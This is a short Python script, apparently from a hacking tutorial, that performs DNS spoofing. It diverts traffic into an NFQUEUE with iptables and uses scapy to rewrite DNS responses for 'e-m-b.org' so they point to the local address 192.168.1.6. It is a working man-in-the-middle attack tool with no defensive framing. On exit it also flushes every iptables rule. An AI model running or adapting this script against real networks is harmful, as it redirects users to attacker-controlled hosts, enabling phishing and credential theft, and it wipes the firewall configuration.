#!/usr/bin/python3

# iptables -I FORWARD -j NFQUEUE --queue-num 0
import netfilterqueue
import subprocess
import scapy.all as scapy

def create_queue():
    subprocess.call(["sudo","iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Creating queue")
    

def create_local_queue():
    subprocess.call(["sudo","iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["sudo","iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Creating queue")


def delete_queue():
    subprocess.call(["sudo","iptables","--flush"])
    print("[-] Deleting queue")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):   #DNSRQ is used for request rr for response
        print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if "e-m-b.org" in str(qname):
            print("[+]Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.6")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  #no of an response count

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
            
    packet.accept()

create_local_queue()
try:
    while(True):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0,process_packet)
        queue.run()
except(KeyboardInterrupt):
    print("\n")
    delete_queue()